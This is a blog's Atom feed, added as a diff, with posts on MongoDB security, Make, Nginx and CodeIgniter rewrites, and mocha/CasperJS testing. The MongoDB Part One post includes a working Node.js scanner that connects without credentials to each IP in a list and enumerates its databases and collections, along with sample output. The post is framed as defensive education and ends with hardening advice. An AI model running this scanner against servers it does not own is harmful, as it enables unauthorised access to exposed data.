@@ -1,0 +1,1749 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <title>Tinple</title>
+    <link href="http://tinple.io/feed" rel="self" />
+    <link href="http://tinple.io/" />
+    <updated>2014-12-18T15:53:47+08:00</updated>
+    <id>http://tinple.io/</id>
+    <entry>
+        <title type="html"><![CDATA[MongoDB Security Part Three]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/mongo-security-part-three"/>
+        <published>2014-12-18T00:00:00+08:00</published>
+        <updated>2014-12-18T15:17:45+08:00</updated>
+        <id>http://tinple.io/tech/mongo-security-part-three</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0">End</h2>
+<p>If you have something to correct, welcome to point it out:D</p>
+
+<h3 id="toc_1">References:</h3>
+
+<ul>
+<li><a href="https://community.rapid7.com/community/metasploit/blog/2014/06/12/you-have-no-sql-inj--sorry-nosql-injections-in-your-application">nosql injection</a></li>
+<li><a href="https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf">Server-Side JavaScript Injection</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">Testing for NoSQL injection</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[MongoDB Security Part Two]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/mongo-security-part-two"/>
+        <published>2014-12-17T00:00:00+08:00</published>
+        <updated>2014-12-18T15:17:12+08:00</updated>
+        <id>http://tinple.io/tech/mongo-security-part-two</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0">End</h2>
+<p>If you have something to correct, welcome to point it out:D</p>
+
+<h3 id="toc_1">References:</h3>
+
+<ul>
+<li><a href="http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html">Attacking NodeJS and MongoDB</a></li>
+<li><a href="http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html">Hacking NodeJS and MongoDB</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">Testing for NoSQL injection</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[MongoDB Security Part One]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/mongo-security-part-one"/>
+        <published>2014-12-15T00:00:00+08:00</published>
+        <updated>2014-12-18T15:53:47+08:00</updated>
+        <id>http://tinple.io/tech/mongo-security-part-one</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p><a href="https://time.xctf.org.cn/ctfs/1/">hctf</a> is over a month away. In the online game, I prepared two <code>MongoDB</code>
+vulnerable applications for players to capture the flag. Actually, <code>NoSQL</code> develops fast these years, and 
+unlike traditional SQL databases, NoSQL databases require fewer relational constraints and consistency checks.
+However, they are still potentially vulnerable to injection attacks, even if they aren&#39;t using the traditional
+sql syntax. I think it&#39;s time for us to focus on NoSQL security, and this is also my initial purpose.</p>
+
+<blockquote>
+<p>NoSQL injection attacks may execute in different areas of an application than traditional SQL injection. Where SQL injection would execute within the database engine, NoSQL variants may execute during within the application layer or the database layer, depending on the NoSQL API used and data model. Typically NoSQL injection attacks will execute where the attack string is parsed, evaluated, or concatenated into a NoSQL API call.</p>
+</blockquote>
+<p>There are now over 150 <a href="http://nosql-database.org/">NoSQL databases</a> available, and <code>MongoDB</code> is the most widely
+used NoSQL database. In a series of MongoDB Security articles, I will show different vulnerable applications,
+the code and payload is available in <a href="https://github.com/Tinple/mongo-attack-example">github</a>.</p>
+<p>For the first part, I would like to show the MongoDB unauthorized access vulnerability, which causes MongoDB
+information leakage because the MongoDB runned without the option <code>--auth</code>.  And the information leakage may
+cause a series of other security problem. </p>
+<p>As the payload may attackable, I only scan my servers for the example. And I write my payload as follow:</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="s2">&quot;data&quot;</span><span class="p">,</span>
+    <span class="nx">lineReader</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&quot;line-reader&quot;</span><span class="p">),</span>
+    <span class="nx">mongoose</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mongoose&#39;</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">conn</span> <span class="p">(</span><span class="nx">host</span><span class="p">,</span> <span class="nx">cb</span><span class="p">){</span>
+    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;mongodb://&#39;</span> <span class="o">+</span> <span class="nx">host</span><span class="p">,</span>
+        <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">server</span><span class="o">:</span> <span class="p">{</span> <span class="nx">socketOptions</span><span class="o">:</span> <span class="p">{</span> <span class="nx">connectTimeoutMS</span><span class="o">:</span> <span class="mi">4000</span> <span class="p">}}},</span>
+        <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
+        <span class="nx">Admin</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">mongo</span><span class="p">.</span><span class="nx">Admin</span><span class="p">;</span>
+    <span class="nx">connection</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+    <span class="p">});</span>
+    <span class="nx">connection</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;open&#39;</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="k">new</span> <span class="nx">Admin</span><span class="p">(</span><span class="nx">connection</span><span class="p">.</span><span class="nx">db</span><span class="p">).</span><span class="nx">listDatabases</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">databases</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">db</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[*] Database %s %s&#39;</span><span class="p">,</span> <span class="nx">db</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">db</span><span class="p">.</span><span class="nx">sizeOnDisk</span><span class="p">);</span>
+                <span class="kd">var</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">(</span><span class="nx">url</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span> <span class="o">+</span> <span class="nx">db</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
+                <span class="nx">db</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+                    <span class="nx">db</span><span class="p">.</span><span class="nx">db</span><span class="p">.</span><span class="nx">collectionNames</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+                        <span class="nx">res</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">collection</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[+] Collection %s&#39;</span><span class="p">,</span> <span class="nx">collection</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
+                        <span class="p">});</span>
+                        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">();</span>
+                        <span class="nx">db</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+                        <span class="nx">connection</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+                    <span class="p">})</span>
+                <span class="p">})</span>
+            <span class="p">})</span>
+        <span class="p">})</span>
+        <span class="nx">cb</span><span class="p">(</span><span class="nx">host</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+<span class="nx">lineReader</span><span class="p">.</span><span class="nx">eachLine</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="nx">line</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">conn</span><span class="p">(</span><span class="nx">line</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">host</span><span class="p">){</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Detected: &quot;</span> <span class="o">+</span> <span class="nx">host</span><span class="p">);</span>
+        <span class="p">});</span>
+    <span class="p">}</span>
+<span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[*] Read Done&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>The payload scans a list of ip, and gets the unauthorized mongo server, what&#39;s more, for every unauthorized
+mongo server, I get their <code>Databases</code> and <code>Collections</code> to stress the importance of information leakage. The
+results for my server as follow:</p>
+
+<pre><code>[*] Read Done
+Detected: xx.xx.xx.xx
+[*] Database erciyuan 218103808
+[*] Database shop 218103808
+[*] Database admin 83886080
+[*] Database test 1
+
+[+] Collection admin.system.version
+[+] Collection admin.system.indexes
+[+] Collection admin.system.users
+
+[+] Collection erciyuan.system.indexes
+[+] Collection erciyuan.system.users
+[+] Collection erciyuan.renwu
+[+] Collection erciyuan.log
+
+[+] Collection shop.system.indexes
+[+] Collection shop.system.users
+[+] Collection shop.users
+[+] Collection shop.feedbacks
+[+] Collection shop.baskets
+[+] Collection shop.products
+
+Detected: xx.xx.xx.xx
+[*] Database vnwa 218103808
+[*] Database admin 83886080
+[*] Database test 1
+
+[+] Collection admin.system.version
+[+] Collection admin.system.indexes
+[+] Collection admin.system.users
+
+[+] Collection vnwa.system.indexes
+[+] Collection vnwa.users
+[+] Collection vnwa.messages</code></pre>
+<p>Besides, the <a href="http://www.hackersoul.com/post/mongodb_unauthorized_access_vulnerability_global_probing_report.html">HackerSoul</a> scan almost 40000 IP list using 
+MongoDB, and give us a report about this vulnerability.</p>
+
+<pre><code>[*] Start-date: 20141202-23:20
+[*] End-date: 20141202-23:28
+[*] Info
+  [+] Target: 39818
+  [+] Success: 7071
+[*] Done</code></pre>
+<p>The results is crazy, hence, be sure to run your mongo with <code>auth</code> flag, or, change the mongo port(
+default is 27017) and start the firewall only allow the white-list ip to connect(something like 
+<a href="http://tinple.io/tech/work-with-iptables">iptables</a>.</p>
+
+<h2 id="toc_0">End</h2>
+<p>If you have something to correct, welcome to point it out:D</p>
+
+<h3 id="toc_1">References:</h3>
+
+<ul>
+<li><a href="http://www.hackersoul.com/post/mongodb_unauthorized_access_vulnerability_global_probing_report.html">mongodb_unauthorized_access</a></li>
+<li><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">Testing for NoSQL injection</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Use Make with javascript]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/use-make-with-javascript"/>
+        <published>2014-12-11T00:00:00+08:00</published>
+        <updated>2014-12-12T21:37:12+08:00</updated>
+        <id>http://tinple.io/tech/use-make-with-javascript</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0">Javascript build tools</h2>
+<p>During my frontend time, I have seen some of tools to build frontend projects. <a href="gruntjs.com">Grunt</a>,
+<a href="gulpjs.com">Gulp</a> and so on. However, these tools often make me get in the way for its verbose
+configuration and long dependent plugins.</p>
+
+<h2 id="toc_1">Why make</h2>
+<p>Actually, most of the tasks we need to build can be run using existing executables in the shell.
+Sass, Uglify, Unit test and so on have awesome executables already, what we need is just an easy way
+to run our commands to build projects without extra tooling and plugins. And <a href="https://www.gnu.org/software/make">Make</a> comes to rescue.</p>
+
+<h2 id="toc_2">What and how</h2>
+
+<blockquote>
+<p>GUN Make is a tool which controls the generation of executables and other non-sources files of a program from the program&#39;s source files.</p>
+</blockquote>
+<p>Though <code>make</code> is perceived as being only for C projects, it is a general-purpose build tool that can be used 
+on any kinds of projects. And in the case of a frontend build, <code>make</code> can help us construct dependency graph 
+and execute some commands directly.</p>
+<p>At begin, we need a file called <code>Makefile</code>. A Makefile consists of rules that has ite own specific purpose.
+Each of these rules has:</p>
+
+<ul>
+<li>a target, it can be a file or just a name</li>
+<li>prerequisites, an optional set of files the target depends on</li>
+<li>commands</li>
+</ul>
+<p>And the syntax for a target is:</p>
+
+<pre><code>target: prerequisites
+    commands</code></pre>
+
+<h2 id="toc_3">A Web project Makefile</h2>
+<p>Next, we will build a simple web project that uses <code>Sass</code>, <code>jade</code>, and we test it using <code>CasperJS</code>.
+The contents of our source files are not important, what we concern is what we need to do with the 
+files to make them ready to run.</p>
+
+<h2 id="toc_4">Reference</h2>
+
+<ul>
+<li><a href="https://www.gnu.org/software/make/manual/make.html">GNU Make Doc</a></li>
+<li><a href="https://blog.jcoglan.com/2014/02/05/building-javascript-projects-with-make/">building-javascript-projects-with-make</a></li>
+<li><a href="http://oxy.fi/2013/02/03/how-to-use-makefiles-in-your-web-projects/">how-to-use-makefiles-in-your-web-projects</a></li>
+<li><a href="https://algorithms.rdio.com/post/make/">make</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Nginx with fucking CI and security]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/nginx-proxy-with-fucking-ci-and-security"/>
+        <published>2014-10-28T00:00:00+08:00</published>
+        <updated>2014-10-28T20:26:28+08:00</updated>
+        <id>http://tinple.io/tech/nginx-proxy-with-fucking-ci-and-security</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0">CI and Nginx</h2>
+<p>Oh, it&#39;s time to note the fucking <code>Codeigniter</code> rewrite with <code>Nginx</code>, which will cause a <code>404</code>
+status to make you (╯°□°）╯︵ ┻━┻.</p>
+<p>If you use <code>Codeigniter</code>, aka <code>CI</code>, you may know its fucking url rewrite with <code>index.php</code>.
+And the rewrite rules are for <code>apache</code> and not <code>nginx</code>. Hence, we should use <code>nginx rewrite rules</code> 
+to get our site up and running.</p>
+<p>Below is a section of my <code>nginx.conf</code>.</p>
+
+<pre><code>server {
+    listen 80 default;
+    server_name www.example.com example.com;
+
+    root  /home/wwwroot/ci/;
+    index index.php;
+
+    location / {
+        if ($request_filename !~ (index.php)) {  
+            rewrite ^/(.*)$ /index.php?$1 last;  
+        }  
+    }
+
+    location ~ .*.(php|php5)?$ {
+        try_files $uri =404;
+        fastcgi_pass  unix:/tmp/php-cgi.sock;
+        fastcgi_index index.php;
+        include fcgi.conf;
+    }
+
+    location ~ .*.(gif|jpg|jpeg|png|bmp|swf|ttf|svg|woff|eot)$ {
+        expires      30d;
+    }
+
+    location ~ .*.(js|css)?$ {
+        expires      12h;
+    }
+
+    access_log  /home/logs/ci_access.log  access;
+    error_log /home/logs/ci_error.log;
+}</code></pre>
+
+<h2 id="toc_1">End</h2>
+<p>If you have something to correct, welcome to point it out:D</p>
+
+<h3 id="toc_2">References:</h3>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Testing with mocha and casperjs]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/testing-with-mocha-and-casperjs"/>
+        <published>2014-10-22T00:00:00+08:00</published>
+        <updated>2014-10-24T10:37:51+08:00</updated>
+        <id>http://tinple.io/tech/testing-with-mocha-and-casperjs</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>When talking about <code>Unit Test</code> in <code>node</code>, <code>mocha</code> flashes first in my brain.</p>
+
+<h2 id="toc_0">mocha &amp;&amp; should.js</h2>
+
+<blockquote>
+<p>Mocha is a feature-rich JavaScript test framework running on node.js and the browser.</p>
+</blockquote>
+<p>I used to use <code>mocha</code> for the elegant way it does async along with familiar BDD style syntax.
+And I worked <code>mocha</code> with <code>should.js</code>, which is a human assertion library.</p>
+
+<h3 id="toc_1">Install</h3>
+
+<pre><code>$ npm install mocha -g 
+$ npm install shou --save-dev</code></pre>
+
+<h3 id="toc_2">First Step</h3>
+<p>Let&#39;s say we have two api to test, and the api script is saved as <code>api.js</code>.</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">Add_sync</span> <span class="o">=</span> <span class="nx">exports</span><span class="p">.</span><span class="nx">Add_sync</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
+<span class="kd">var</span> <span class="nx">Add_async</span> <span class="o">=</span> <span class="nx">exports</span><span class="p">.</span><span class="nx">Add_async</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{};</span>
+<span class="nx">Add_sync</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">add</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">b</span><span class="p">;</span> <span class="p">};</span>
+<span class="nx">Add_async</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">add</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="nx">cb</span><span class="p">(</span><span class="nx">a</span> <span class="o">+</span> <span class="nx">b</span><span class="p">);</span>
+    <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>Now we can check these two api&#39;s behavior right or not, save it as <code>test/test.js</code>.</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">should</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;should&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">add_sync</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../api.js&#39;</span><span class="p">).</span><span class="nx">Add_sync</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">add_async</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../api.js&#39;</span><span class="p">).</span><span class="nx">Add_async</span><span class="p">;</span>
+<span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;test api&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;sync add api&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="nx">it</span><span class="p">(</span><span class="s1">&#39;should return 3&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">adder</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">add_sync</span><span class="p">();</span>
+            <span class="nx">adder</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">).</span><span class="nx">should</span><span class="p">.</span><span class="nx">equal</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+        <span class="p">});</span>
+    <span class="p">});</span>
+
+    <span class="nx">describe</span><span class="p">(</span><span class="s1">&#39;async add api&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="nx">it</span><span class="p">(</span><span class="s1">&#39;should callback with 3&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">done</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">adder</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">add_async</span><span class="p">();</span>
+            <span class="nx">adder</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">res</span><span class="p">.</span><span class="nx">should</span><span class="p">.</span><span class="nx">equal</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+                <span class="nx">done</span><span class="p">();</span>
+            <span class="p">});</span>
+        <span class="p">});</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+</pre></div>
+<p>Pay attention to testing asynchronous code that you should add a callback(usually named done)
+to it(). <code>Mocha</code> will know that it should wait for completion.</p>
+<p>Besides, <code>Mocha</code> supports all hooks that is <code>before()</code>, <code>after()</code>, <code>beforeEach()</code>, <code>afterEach()</code>.
+We use within <code>describe()</code> at any nesting level, and use outside <code>describe()</code> for global scope.</p>
+
+<h3 id="toc_3">Running the tests</h3>
+
+<blockquote>
+<p>By default mocha(1) will use the pattern ./test/*.js, so it&#39;s usually a good place to put your tests.</p>
+</blockquote>
+<p>However, I prefer to set up a <code>Makefile</code> in the root of the project.</p>
+
+<pre><code>test:
+    @./node_modules/.bin/mocha \
+        --require should \
+        --reporter dot \
+        --bail \
+
+.PHONY: test</code></pre>
+<p>Then we can just run our tests with <code>$ make test</code>. There are tons of options, visit
+<a href="http://mochajs.github.io/mocha/">mocha</a> for more information.</p>
+<p>Well, when refering to frontend tests, we focus more on <code>Functional Tests</code>. Sometimes we 
+may just <code>refresh-click-click-click</code> and the testing is done. But how to do with some 
+hudge <code>javascript</code> code on user interface or hundreds of refreshes and clicks? Hence, 
+we still need something to automate test.</p>
+
+<h2 id="toc_4">casper.js &amp;&amp; phantomjs</h2>
+<p>Even though <code>mocha</code> also support browser, <a href="http://casperjs.org/">CasperJS</a> is my favorite.</p>
+
+<blockquote>
+<p>CasperJS, a toolkit on top of PhantomJS.</p>
+</blockquote>
+<p>So let&#39;s begin with <a href="http://phantomjs.org/">PhantomJS</a>.</p>
+
+<blockquote>
+<p>PhantomJS is a headless WebKit with Javascript API.</p>
+</blockquote>
+<p>So what&#39;s headless? You most likely know what a browser is, now take away the GUI, that&#39;s
+called a headless browser. You can think of it as a programmable browser for the terminal.
+It&#39;s really cool!</p>
+<p>And <code>PhantomJS</code> has fast and native support for various web standards like DOM handling,
+CSS selectors, JSON, Canvas and SVG. For me, I code with <code>PhantomJS</code> just like code with <code>node</code>!</p>
+<p>However, <code>PhantomJS</code> itself is not a test framework, it is only used to launch the tests
+via a suitable test runner. Hence, <code>CasperJS</code> comes.</p>
+<p><code>CasperJS</code> is an open source navigation scripting and testing utility based on <code>PhantomJS</code>,
+also support <code>SlimerJS(Gecko)</code>. So <code>PhantomJS</code> provides the headless browser capability,
+and <code>CasperJS</code> fills in the rest: it runs on top of Phantom with built in testing functionality
+allows for navigation scripting. Let&#39;s begin our frontend test!</p>
+
+<h3 id="toc_5">Install on OSX</h3>
+
+<pre><code>$ brew install phantomjs
+$ brew install casperjs --devel</code></pre>
+<p>As <code>CasperJS</code> 1.1 branch is now pretty stable and supports testing utility, I choose this
+version to start.</p>
+
+<h3 id="toc_6">Casper Test API</h3>
+<p>Now let&#39;s open up the <code>/go/programmer</code> subnode on <a href="http://www.v2ex.com/">v2ex</a>, click the
+first topic link and confirm that we do the right operation. </p>
+<div class="highlight"><pre><span class="nx">casper</span><span class="p">.</span><span class="nx">options</span><span class="p">.</span><span class="nx">viewportSize</span> <span class="o">=</span> <span class="p">{</span><span class="nx">width</span><span class="o">:</span> <span class="mi">1024</span><span class="p">,</span> <span class="nx">height</span><span class="o">:</span> <span class="mi">768</span><span class="p">};</span>
+<span class="kd">var</span> <span class="nx">testCount</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+<span class="nx">casper</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">begin</span><span class="p">(</span><span class="s2">&quot;Testing V2EX&quot;</span><span class="p">,</span> <span class="nx">testCount</span><span class="p">,</span> <span class="kd">function</span> <span class="nx">suite</span> <span class="p">(</span><span class="nx">test</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">casper</span><span class="p">.</span><span class="nx">start</span><span class="p">(</span><span class="s2">&quot;http://www.v2ex.com/go/programmer&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">test</span><span class="p">.</span><span class="nx">assertTitleMatch</span><span class="p">(</span><span class="sr">/程序员/</span><span class="p">,</span> <span class="s2">&quot;Title is what we&#39;d expect&quot;</span><span class="p">);</span>
+        <span class="nx">casper</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s2">&quot;a[href*=&#39;/t/&#39;]&quot;</span><span class="p">);</span>
+        <span class="nx">casper</span><span class="p">.</span><span class="nx">waitForUrl</span><span class="p">(</span><span class="sr">/\/t\/*/</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+            <span class="nx">test</span><span class="p">.</span><span class="nx">assertExists</span><span class="p">(</span><span class="s2">&quot;.topic_content&quot;</span><span class="p">,</span> <span class="s2">&quot;Find the content&quot;</span><span class="p">);</span>
+            <span class="nx">casper</span><span class="p">.</span><span class="nx">capture</span><span class="p">(</span><span class="s2">&quot;v2ex.png&quot;</span><span class="p">);</span>  
+        <span class="p">});</span>
+    <span class="p">}).</span><span class="nx">run</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">test</span><span class="p">.</span><span class="nx">done</span><span class="p">();</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+</pre></div>
+<p>Here, after we click the first topic link, we wait for the url to change and the content
+of the first topic page to load. And capture the whole page and saved as <code>v2ex.png</code>.
+Actually, you can also wrap your follow-up codes in a <code>then()</code> callback in order to see 
+the changes from your click event.</p>
+<div class="highlight"><pre><span class="nx">casper</span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">test</span><span class="p">.</span><span class="nx">assertExists</span><span class="p">(</span><span class="s2">&quot;.topic_content&quot;</span><span class="p">,</span> <span class="s2">&quot;Find the content&quot;</span><span class="p">);</span>
+    <span class="nx">casper</span><span class="p">.</span><span class="nx">capture</span><span class="p">(</span><span class="s2">&quot;v2ex2.png&quot;</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+<p>The <code>then()</code> callback staff is an implementation of the Promise Pattern. Hence, after
+calling other casper api like <code>fill()</code> and <code>sendKeys()</code>, you should wrap your next interaction
+in <code>casper.then()</code>. </p>
+<p>The <code>fill()</code> api is a convenient way to fill out and submit the form on web page.</p>
+<div class="highlight"><pre><span class="nx">casper</span><span class="p">.</span><span class="nx">options</span><span class="p">.</span><span class="nx">viewportSize</span> <span class="o">=</span> <span class="p">{</span><span class="nx">width</span><span class="o">:</span> <span class="mi">1024</span><span class="p">,</span> <span class="nx">height</span><span class="o">:</span> <span class="mi">768</span><span class="p">};</span>
+<span class="kd">var</span> <span class="nx">testCount</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+<span class="nx">casper</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">begin</span><span class="p">(</span><span class="s2">&quot;Searching V2EX&quot;</span><span class="p">,</span> <span class="nx">testCount</span><span class="p">,</span> <span class="kd">function</span> <span class="nx">suite</span><span class="p">(</span><span class="nx">test</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">casper</span><span class="p">.</span><span class="nx">start</span><span class="p">(</span><span class="s2">&quot;http://www.v2ex.com/&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">casper</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="s2">&quot;form&quot;</span><span class="p">,</span> <span class="p">{</span>
+            <span class="s2">&quot;q&quot;</span><span class="o">:</span> <span class="s2">&quot;casper&quot;</span>
+        <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
+        <span class="nx">casper</span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
